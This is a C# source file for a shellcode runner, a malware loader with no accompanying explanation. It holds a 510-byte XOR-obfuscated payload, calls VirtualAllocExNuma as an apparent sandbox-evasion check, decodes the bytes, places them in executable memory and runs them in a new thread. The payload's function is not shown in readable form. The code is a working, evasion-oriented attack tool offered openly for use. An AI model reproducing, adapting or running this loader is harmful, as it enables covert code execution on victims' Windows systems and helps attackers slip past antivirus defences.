using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Microsoft.Win32.SafeHandles;

namespace shellcode_runner
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);

            if (mem == null)
            {
                return;
            }


            byte[] buf = new byte[510] {
            0x41, 0x8d, 0xf1, 0xf9, 0xf5, 0x1a, 0x0e, 0x56, 0x04, 0xdf, 0x57, 0xfd, 0xf3, 0xf9, 0xf4, 0x20, 0xac, 0x9a, 0xad, 0xe2, 0x55, 0x6d, 0xe2, 0x55, 0x6c, 0xcc, 0x2b, 0x95, 0x85, 0x53, 0xde, 0xad, 0x2a, 0x94, 0x0e, 0xdf, 0x40, 0x41, 0x4c, 0x55, 0x4b, 0x42, 0x7e, 0x55, 0x55, 0x55, 0xb1, 0x0e, 0x4d, 0xf9, 0x32, 0x55, 0x41, 0x59, 0x71, 0xb1, 0xb1, 0xb1, 0xf0, 0xe0, 0xf0, 0xe1, 0xe3, 0xe0, 0xe7, 0xf9, 0x80, 0x63, 0xd4, 0xf9, 0x3a, 0xe3, 0xd1, 0xf9, 0x3a, 0xe3, 0xa9, 0xf9, 0x3a, 0xe3, 0x91, 0xf9, 0x3a, 0xc3, 0xe1, 0xf9, 0xbe, 0x06, 0xfb, 0xfb, 0xfc, 0x80, 0x78, 0xf9, 0x80, 0x71, 0x1d, 0x8d, 0xd0, 0xcd, 0xb3, 0x9d, 0x91, 0xf0, 0x70, 0x78, 0xbc, 0xf0, 0xb0, 0x70, 0x53, 0x5c, 0xe3, 0xf0, 0xe0, 0xf9, 0x3a, 0xe3, 0x91, 0x3a, 0xf3, 0x8d, 0xf9, 0xb0, 0x61, 0x3a, 0x31, 0x39, 0xb1, 0xb1, 0xb1, 0xf9, 0x34, 0x71, 0xc5, 0xd6, 0xf9, 0xb0, 0x61, 0xe1, 0x3a, 0xf9, 0xa9, 0xf5, 0x3a, 0xf1, 0x91, 0xf8, 0xb0, 0x61, 0x52, 0xe7, 0xf9, 0x4e, 0x78, 0xf0, 0x3a, 0x85, 0x39, 0xf9, 0xb0, 0x67, 0xfc, 0x80, 0x78, 0xf9, 0x80, 0x71, 0x1d, 0xf0, 0x70, 0x78, 0xbc, 0xf0, 0xb0, 0x70, 0x89, 0x51, 0xc4, 0x40, 0xfd, 0xb2, 0xfd, 0x95, 0xb9, 0xf4, 0x88, 0x60, 0xc4, 0x69, 0xe9, 0xf5, 0x3a, 0xf1, 0x95, 0xf8, 0xb0, 0x61, 0xd7, 0xf0, 0x3a, 0xbd, 0xf9, 0xf5, 0x3a, 0xf1, 0xad, 0xf8, 0xb0, 0x61, 0xf0, 0x3a, 0xb5, 0x39, 0xf9, 0xb0, 0x61, 0xf0, 0xe9, 0xf0, 0xe9, 0xef, 0xe8, 0xeb, 0xf0, 0xe9, 0xf0, 0xe8, 0xf0, 0xeb, 0xf9, 0x32, 0x5d, 0x91, 0xf0, 0xe3, 0x4e, 0x51, 0xe9, 0xf0, 0xe8, 0xeb, 0xf9, 0x3a, 0xa3, 0x58, 0xe6, 0x4e, 0x4e, 0x4e, 0xec, 0xf8, 0x0f, 0xc6, 0xc2, 0x83, 0xee, 0x82, 0x83, 0xb1, 0xb1, 0xf0, 0xe7, 0xf8, 0x38, 0x57, 0xf9, 0x30, 0x5d, 0x11, 0xb0, 0xb1, 0xb1, 0xf8, 0x38, 0x54, 0xf8, 0x0d, 0xb3, 0xb1, 0xb1, 0xe1, 0x85, 0xf3, 0xa5, 0x83, 0xf0, 0xe5, 0xf8, 0x38, 0x55, 0xfd, 0x38, 0x40, 0xf0, 0x0b, 0xfd, 0xc6, 0x97, 0xb6, 0x4e, 0x64, 0xfd, 0x38, 0x5b, 0xd9, 0xb0, 0xb0, 0xb1, 0xb1, 0xe8, 0xf0, 0x0b, 0x98, 0x31, 0xda, 0xb1, 0x4e, 0x64, 0xe1, 0xe1, 0xfc, 0x80, 0x78, 0xfc, 0x80, 0x71, 0xf9, 0x4e, 0x71, 0xf9, 0x38, 0x73, 0xf9, 0x4e, 0x71, 0xf9, 0x38, 0x70, 0xf0, 0x0b, 0x5b, 0xbe, 0x6e, 0x51, 0x4e, 0x64, 0xf9, 0x38, 0x76, 0xdb, 0xa1, 0xf0, 0xe9, 0xfd, 0x38, 0x53, 0xf9, 0x38, 0x48, 0xf0, 0x0b, 0x28, 0x14, 0xc5, 0xd0, 0x4e, 0x64, 0xf9, 0x30, 0x75, 0xf1, 0xb3, 0xb1, 0xb1, 0xf8, 0x09, 0xd2, 0xdc, 0xd5, 0xb1, 0xb1, 0xb1, 0xb1, 0xb1, 0xf0, 0xe1, 0xf0, 0xe1, 0xf9, 0x38, 0x53, 0xe6, 0xe6, 0xe6, 0xfc, 0x80, 0x71, 0xdb, 0xbc, 0xe8, 0xf0, 0xe1, 0x53, 0x4d, 0xd7, 0x76, 0xf5, 0x95, 0xe5, 0xb0, 0xb0, 0xf9, 0x3c, 0xf5, 0x95, 0xa9, 0x77, 0xb1, 0xd9, 0xf9, 0x38, 0x57, 0xe7, 0xe1, 0xf0, 0xe1, 0xf0, 0xe1, 0xf0, 0xe1, 0xf8, 0x4e, 0x71, 0xf0, 0xe1, 0xf8, 0x4e, 0x79, 0xfc, 0x38, 0x70, 0xfd, 0x38, 0x70, 0xf0, 0x0b, 0xc8, 0x7d, 0x8e, 0x37, 0x4e, 0x64, 0xf9, 0x80, 0x63, 0xf9, 0x4e, 0x7b, 0x3a, 0xbf, 0xf0, 0x0b, 0xb9, 0x36, 0xac, 0xd1, 0x4e, 0x64, 0x0a, 0x41, 0x04, 0x13, 0xe7, 0xf0, 0x0b, 0x17, 0x24, 0x0c, 0x2c, 0x4e, 0x64, 0xf9, 0x32, 0x75, 0x99, 0x8d, 0xb7, 0xcd, 0xbb, 0x31, 0x4a, 0x51, 0xc4, 0xb4, 0x0a, 0xf6, 0xa2, 0xc3, 0xde, 0xdb, 0xb1, 0xe8, 0xf0, 0x38, 0x6b, 0x4e, 0x64, 0x85, 0x53};
 
            for (int i = 0; i < buf.Length; i++) {
                buf[i] = (byte)(((uint)buf[i] ^ 0xAA) & 0xFF);
            }
            int size = buf.Length;
            
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            
            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);

        }
    }
}